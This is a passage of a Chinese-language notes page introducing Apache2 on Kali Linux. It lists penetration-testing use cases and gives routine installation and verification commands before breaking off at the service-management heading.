<!DOCTYPE html>
<html lang="en"><head><title>Apache2</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted Grotesk:wght@400;700&amp;family=Source Sans Pro:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Quartz 4"/><meta property="og:title" content="Apache2"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Apache2"/><meta name="twitter:description" content="Kali Linux中Apache完整使用指南 一、Apache简介与用途 在Kali Linux中的应用场景 渗透测试环境搭建 - 模拟真实Web服务器环境 Web应用安全测试 - 测试SQL注入、XSS等漏洞 钓鱼页面测试（仅限授权测试） - 社会工程学演练 托管安全工具和脚本 - 部署BeEF、Metasploit Payloads等 搭建本地测试环境 - DVWA、WebGoat等靶场 反向代理和流量分析 - 拦截和分析HTTP/HTTPS流量 文件传输服务器 - 在内网渗透中快速传输文件 二、安装与基础配置 1."/><meta property="og:description" content="Kali Linux中Apache完整使用指南 一、Apache简介与用途 在Kali Linux中的应用场景 渗透测试环境搭建 - 模拟真实Web服务器环境 Web应用安全测试 - 测试SQL注入、XSS等漏洞 钓鱼页面测试（仅限授权测试） - 社会工程学演练 托管安全工具和脚本 - 部署BeEF、Metasploit Payloads等 搭建本地测试环境 - DVWA、WebGoat等靶场 反向代理和流量分析 - 拦截和分析HTTP/HTTPS流量 文件传输服务器 - 在内网渗透中快速传输文件 二、安装与基础配置 1."/><meta property="og:image:alt" content="Kali Linux中Apache完整使用指南 一、Apache简介与用途 在Kali Linux中的应用场景 渗透测试环境搭建 - 模拟真实Web服务器环境 Web应用安全测试 - 测试SQL注入、XSS等漏洞 钓鱼页面测试（仅限授权测试） - 社会工程学演练 托管安全工具和脚本 - 部署BeEF、Metasploit Payloads等 搭建本地测试环境 - DVWA、WebGoat等靶场 反向代理和流量分析 - 拦截和分析HTTP/HTTPS流量 文件传输服务器 - 在内网渗透中快速传输文件 二、安装与基础配置 1."/><meta property="og:image" content="https://quartz.jzhao.xyz/static/og-image.png"/><meta property="og:image:url" content="https://quartz.jzhao.xyz/static/og-image.png"/><meta name="twitter:image" content="https://quartz.jzhao.xyz/static/og-image.png"/><meta property="og:image:type" content="image/.png"/><meta property="twitter:domain" content="quartz.jzhao.xyz"/><meta property="og:url" content="https://quartz.jzhao.xyz/Linux/命令行工具/Apache2"/><meta property="twitter:url" content="https://quartz.jzhao.xyz/Linux/命令行工具/Apache2"/><link rel="icon" href="../../static/icon.png"/><meta name="description" content="Kali Linux中Apache完整使用指南 一、Apache简介与用途 在Kali Linux中的应用场景 渗透测试环境搭建 - 模拟真实Web服务器环境 Web应用安全测试 - 测试SQL注入、XSS等漏洞 钓鱼页面测试（仅限授权测试） - 社会工程学演练 托管安全工具和脚本 - 部署BeEF、Metasploit Payloads等 搭建本地测试环境 - DVWA、WebGoat等靶场 反向代理和流量分析 - 拦截和分析HTTP/HTTPS流量 文件传输服务器 - 在内网渗透中快速传输文件 二、安装与基础配置 1."/><meta name="generator" content="Quartz"/><link href="../../index.css" rel="stylesheet" type="text/css" spa-preserve/><style>.expand-button {
  position: absolute;
  display: flex;
  float: right;
  padding: 0.4rem;
  margin: 0.3rem;
  right: 0;
  color: var(--gray);
  border-color: var(--dark);
  background-color: var(--light);
  border: 1px solid;
  border-radius: 5px;
  opacity: 0;
  transition: 0.2s;
}
.expand-button > svg {
  fill: var(--light);
  filter: contrast(0.3);
}
.expand-button:hover {
  cursor: pointer;
  border-color: var(--secondary);
}
.expand-button:focus {
  outline: 0;
}

pre:hover > .expand-button {
  opacity: 1;
  transition: 0.2s;
}

#mermaid-container {
  position: fixed;
  contain: layout;
  z-index: 999;
  left: 0;
  top: 0;
  width: 100vw;
  height: 100vh;
  overflow: hidden;
  display: none;
  backdrop-filter: blur(4px);
  background: rgba(0, 0, 0, 0.5);
}
#mermaid-container.active {
  display: inline-block;
}
#mermaid-container > #mermaid-space {
  border: 1px solid var(--lightgray);
  background-color: var(--light);
  border-radius: 5px;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  height: 80vh;
  width: 80vw;
  overflow: hidden;
}
#mermaid-container > #mermaid-space > .mermaid-content {
  padding: 2rem;
  position: relative;
  transform-origin: 0 0;
  transition: transform 0.1s ease;
  overflow: visible;
  min-height: 200px;
  min-width: 200px;
}
#mermaid-container > #mermaid-space > .mermaid-content pre {
  margin: 0;
  border: none;
}
#mermaid-container > #mermaid-space > .mermaid-content svg {
  max-width: none;
  height: auto;
}
#mermaid-container > #mermaid-space > .mermaid-controls {
  position: absolute;
  bottom: 20px;
  right: 20px;
  display: flex;
  gap: 8px;
  padding: 8px;
  background: var(--light);
  border: 1px solid var(--lightgray);
  border-radius: 6px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
  z-index: 2;
}
#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 32px;
  height: 32px;
  padding: 0;
  border: 1px solid var(--lightgray);
  background: var(--light);
  color: var(--dark);
  border-radius: 4px;
  cursor: pointer;
  font-size: 16px;
  font-family: var(--bodyFont);
  transition: all 0.2s ease;
}
#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:hover {
  background: var(--lightgray);
}
#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:active {
  transform: translateY(1px);
}
#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:nth-child(2) {
  width: auto;
  padding: 0 12px;
  font-size: 14px;
}
/*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VSb290IjoiRTpcXFByb2plY3RcXGdpdFxccXVhcnR6XFxxdWFydHpcXGNvbXBvbmVudHNcXHN0eWxlcyIsInNvdXJjZXMiOlsibWVybWFpZC5pbmxpbmUuc2NzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUVBO0VBQ0U7RUFDQTs7QUFHRjtFQUNFO0VBQ0E7O0FBR0Y7RUFDRTs7O0FBS0Y7RUFDRTtFQUNBOzs7QUFJSjtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTs7QUFHRjtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUVBO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBOztBQUdGO0VBQ0U7RUFDQTs7QUFJSjtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBOztBQUVBO0VBQ0U7O0FBR0Y7RUFDRTs7QUFJRjtFQUNFO0VBQ0E7RUFDQSIsInNvdXJjZXNDb250ZW50IjpbIi5leHBhbmQtYnV0dG9uIHtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICBkaXNwbGF5OiBmbGV4O1xuICBmbG9hdDogcmlnaHQ7XG4gIHBhZGRpbmc6IDAuNHJlbTtcbiAgbWFyZ2luOiAwLjNyZW07XG4gIHJpZ2h0OiAwOyAvLyBOT1RFOiByaWdodCB3aWxsIGJlIHNldCBpbiBtZXJtYWlkLmlubGluZS50c1xuICBjb2xvcjogdmFyKC0tZ3JheSk7XG4gIGJvcmRlci1jb2xvcjogdmFyKC0tZGFyayk7XG4gIGJhY2tncm91bmQtY29sb3I6IHZhcigtLWxpZ2h0KTtcbiAgYm9yZGVyOiAxcHggc29saWQ7XG4gIGJvcmRlci1yYWRpdXM6IDVweDtcbiAgb3BhY2l0eTogMDtcbiAgdHJhbnNpdGlvbjogMC4ycztcblxuICAmID4gc3ZnIHtcbiAgICBmaWxsOiB2YXIoLS1saWdodCk7XG4gICAgZmlsdGVyOiBjb250cmFzdCgwLjMpO1xuICB9XG5cbiAgJjpob3ZlciB7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIGJvcmRlci1jb2xvcjogdmFyKC0tc2Vjb25kYXJ5KTtcbiAgfVxuXG4gICY6Zm9jdXMge1xuICAgIG91dGxpbmU6IDA7XG4gIH1cbn1cblxucHJlIHtcbiAgJjpob3ZlciA+IC5leHBhbmQtYnV0dG9uIHtcbiAgICBvcGFjaXR5OiAxO1xuICAgIHRyYW5zaXRpb246IDAuMnM7XG4gIH1cbn1cblxuI21lcm1haWQtY29udGFpbmVyIHtcbiAgcG9zaXRpb246IGZpeGVkO1xuICBjb250YWluOiBsYXlvdXQ7XG4gIHotaW5kZXg6IDk5OTtcbiAgbGVmdDogMDtcbiAgdG9wOiAwO1xuICB3aWR0aDogMTAwdnc7XG4gIGhlaWdodDogMTAwdmg7XG4gIG92ZXJmbG93OiBoaWRkZW47XG4gIGRpc3BsYXk6IG5vbmU7XG4gIGJhY2tkcm9wLWZpbHRlcjogYmx1cig0cHgpO1xuICBiYWNrZ3JvdW5kOiByZ2JhKDAsIDAsIDAsIDAuNSk7XG5cbiAgJi5hY3RpdmUge1xuICAgIGRpc3BsYXk6IGlubGluZS1ibG9jaztcbiAgfVxuXG4gICYgPiAjbWVybWFpZC1zcGFjZSB7XG4gICAgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tbGlnaHRncmF5KTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB2YXIoLS1saWdodCk7XG4gICAgYm9yZGVyLXJhZGl1czogNXB4O1xuICAgIHBvc2l0aW9uOiBmaXhlZDtcbiAgICB0b3A6IDUwJTtcbiAgICBsZWZ0OiA1MCU7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7XG4gICAgaGVpZ2h0OiA4MHZoO1xuICAgIHdpZHRoOiA4MHZ3O1xuICAgIG92ZXJmbG93OiBoaWRkZW47XG5cbiAgICAmID4gLm1lcm1haWQtY29udGVudCB7XG4gICAgICBwYWRkaW5nOiAycmVtO1xuICAgICAgcG9zaXRpb246IHJlbGF0aXZlO1xuICAgICAgdHJhbnNmb3JtLW9yaWdpbjogMCAwO1xuICAgICAgdHJhbnNpdGlvbjogdHJhbnNmb3JtIDAuMXMgZWFzZTtcbiAgICAgIG92ZXJmbG93OiB2aXNpYmxlO1xuICAgICAgbWluLWhlaWdodDogMjAwcHg7XG4gICAgICBtaW4td2lkdGg6IDIwMHB4O1xuXG4gICAgICBwcmUge1xuICAgICAgICBtYXJnaW46IDA7XG4gICAgICAgIGJvcmRlcjogbm9uZTtcbiAgICAgIH1cblxuICAgICAgc3ZnIHtcbiAgICAgICAgbWF4LXdpZHRoOiBub25lO1xuICAgICAgICBoZWlnaHQ6IGF1dG87XG4gICAgICB9XG4gICAgfVxuXG4gICAgJiA+IC5tZXJtYWlkLWNvbnRyb2xzIHtcbiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICAgIGJvdHRvbTogMjBweDtcbiAgICAgIHJpZ2h0OiAyMHB4O1xuICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgIGdhcDogOHB4O1xuICAgICAgcGFkZGluZzogOHB4O1xuICAgICAgYmFja2dyb3VuZDogdmFyKC0tbGlnaHQpO1xuICAgICAgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tbGlnaHRncmF5KTtcbiAgICAgIGJvcmRlci1yYWRpdXM6IDZweDtcbiAgICAgIGJveC1zaGFkb3c6IDAgMnB4IDRweCByZ2JhKDAsIDAsIDAsIDAuMSk7XG4gICAgICB6LWluZGV4OiAyO1xuXG4gICAgICAubWVybWFpZC1jb250cm9sLWJ1dHRvbiB7XG4gICAgICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgICAgICB3aWR0aDogMzJweDtcbiAgICAgICAgaGVpZ2h0OiAzMnB4O1xuICAgICAgICBwYWRkaW5nOiAwO1xuICAgICAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1saWdodCk7XG4gICAgICAgIGNvbG9yOiB2YXIoLS1kYXJrKTtcbiAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4O1xuICAgICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgICAgIGZvbnQtc2l6ZTogMTZweDtcbiAgICAgICAgZm9udC1mYW1pbHk6IHZhcigtLWJvZHlGb250KTtcbiAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMnMgZWFzZTtcblxuICAgICAgICAmOmhvdmVyIHtcbiAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1saWdodGdyYXkpO1xuICAgICAgICB9XG5cbiAgICAgICAgJjphY3RpdmUge1xuICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgxcHgpO1xuICAgICAgICB9XG5cbiAgICAgICAgLy8gU3R5bGUgdGhlIHJlc2V0IGJ1dHRvbiBkaWZmZXJlbnRseVxuICAgICAgICAmOm50aC1jaGlsZCgyKSB7XG4gICAgICAgICAgd2lkdGg6IGF1dG87XG4gICAgICAgICAgcGFkZGluZzogMCAxMnB4O1xuICAgICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgfVxuICAgICAgfVxuICAgIH1cbiAgfVxufVxuIl19 */</style><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" spa-preserve/><script src="../../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../../static/contentIndex.json").then(data => data.json())</script><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://quartz.jzhao.xyz/index.xml"/></head><body data-slug="Linux/命令行工具/Apache2"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"><h2 class="page-title"><a href="../..">Quartz 4</a></h2><div class="spacer mobile-only"></div><div class="flex-component" style="flex-direction: row; flex-wrap: nowrap; gap: 1rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button"><p>Search</p><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div class="search-layout" data-preview="true"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="readermode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="readerIcon" fill="currentColor" stroke="currentColor" stroke-width="0.2" stroke-linecap="round" stroke-linejoin="round" width="64px" height="64px" viewBox="0 0 24 24" aria-label="Reader mode"><title>Reader mode</title><g transform="translate(-1.8, -1.8) scale(1.15, 1.2)"><path d="M8.9891247,2.5 C10.1384702,2.5 11.2209868,2.96705384 12.0049645,3.76669482 C12.7883914,2.96705384 13.8709081,2.5 15.0202536,2.5 L18.7549359,2.5 C19.1691495,2.5 19.5049359,2.83578644 19.5049359,3.25 L19.5046891,4.004 L21.2546891,4.00457396 C21.6343849,4.00457396 21.9481801,4.28672784 21.9978425,4.6528034 L22.0046891,4.75457396 L22.0046891,20.25 C22.0046891,20.6296958 21.7225353,20.943491 21.3564597,20.9931534 L21.2546891,21 L2.75468914,21 C2.37499337,21 2.06119817,20.7178461 2.01153575,20.3517706 L2.00468914,20.25 L2.00468914,4.75457396 C2.00468914,4.37487819 2.28684302,4.061083 2.65291858,4.01142057 L2.75468914,4.00457396 L4.50368914,4.004 L4.50444233,3.25 C4.50444233,2.87030423 4.78659621,2.55650904 5.15267177,2.50684662 L5.25444233,2.5 L8.9891247,2.5 Z M4.50368914,5.504 L3.50468914,5.504 L3.50468914,19.5 L10.9478955,19.4998273 C10.4513189,18.9207296 9.73864328,18.5588115 8.96709342,18.5065584 L8.77307039,18.5 L5.25444233,18.5 C4.87474657,18.5 4.56095137,18.2178461 4.51128895,17.8517706 L4.50444233,17.75 L4.50368914,5.504 Z M19.5049359,17.75 C19.5049359,18.1642136 19.1691495,18.5 18.7549359,18.5 L15.2363079,18.5 C14.3910149,18.5 13.5994408,18.8724714 13.0614828,19.4998273 L20.5046891,19.5 L20.5046891,5.504 L19.5046891,5.504 L19.5049359,17.75 Z M18.0059359,3.999 L15.0202536,4 L14.8259077,4.00692283 C13.9889509,4.06666544 13.2254227,4.50975805 12.7549359,5.212 L12.7549359,17.777 L12.7782651,17.7601316 C13.4923805,17.2719483 14.3447024,17 15.2363079,17 L18.0059359,16.999 L18.0056891,4.798 L18.0033792,4.75457396 L18.0056891,4.71 L18.0059359,3.999 Z M8.9891247,4 L6.00368914,3.999 L6.00599909,4.75457396 L6.00599909,4.75457396 L6.00368914,4.783 L6.00368914,16.999 L8.77307039,17 C9.57551536,17 10.3461406,17.2202781 11.0128313,17.6202194 L11.2536891,17.776 L11.2536891,5.211 C10.8200889,4.56369974 10.1361548,4.13636104 9.37521067,4.02745763 L9.18347055,4.00692283 L8.9891247,4 Z"></path></g></svg></button></div></div><div class="explorer" data-behavior="link" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a,b)=>!a.isFolder&amp;&amp;!b.isFolder||a.isFolder&amp;&amp;b.isFolder?a.displayName.localeCompare(b.displayName,void 0,{numeric:!0,sensitivity:\&quot;base\&quot;}):!a.isFolder&amp;&amp;b.isFolder?1:-1&quot;,&quot;filterFn&quot;:&quot;node=>node.slugSegment!==\&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;node=>node&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-37"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-37" class="explorer-content" aria-expanded="false" role="group"><ul class="explorer-ul overflow" id="list-0"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#"></a></li></template><template id="template-folder"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../Linux/">Linux</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../Linux/命令行工具/">命令行工具</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>Apache2</a></div></nav><h1 class="article-title">Apache2</h1><p show-comma="true" class="content-meta"><time datetime="2025-11-17T01:23:25.000Z">Nov 17, 2025</time><span>59 min read</span></p></div></div><article class="popover-hint"><h1 id="kali-linux中apache完整使用指南">Kali Linux中Apache完整使用指南<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#kali-linux中apache完整使用指南" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
<h2 id="一apache简介与用途">一、Apache简介与用途<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#一apache简介与用途" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="在kali-linux中的应用场景">在Kali Linux中的应用场景<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#在kali-linux中的应用场景" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<ul>
<li><strong>渗透测试环境搭建</strong> - 模拟真实Web服务器环境</li>
<li><strong>Web应用安全测试</strong> - 测试SQL注入、XSS等漏洞</li>
<li><strong>钓鱼页面测试</strong>（仅限授权测试） - 社会工程学演练</li>
<li><strong>托管安全工具和脚本</strong> - 部署BeEF、Metasploit Payloads等</li>
<li><strong>搭建本地测试环境</strong> - DVWA、WebGoat等靶场</li>
<li><strong>反向代理和流量分析</strong> - 拦截和分析HTTP/HTTPS流量</li>
<li><strong>文件传输服务器</strong> - 在内网渗透中快速传输文件</li>
</ul>
<h2 id="二安装与基础配置">二、安装与基础配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#二安装与基础配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="1-安装apache2">1. 安装Apache2<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-安装apache2" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 更新软件包列表</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> update</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装Apache2</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 检查安装版本</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -v</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 验证安装</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -I</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost</span></span></code></pre></figure>
<h3 id="2-基本服务管理">2. 基本服务管理<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-基本服务管理" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
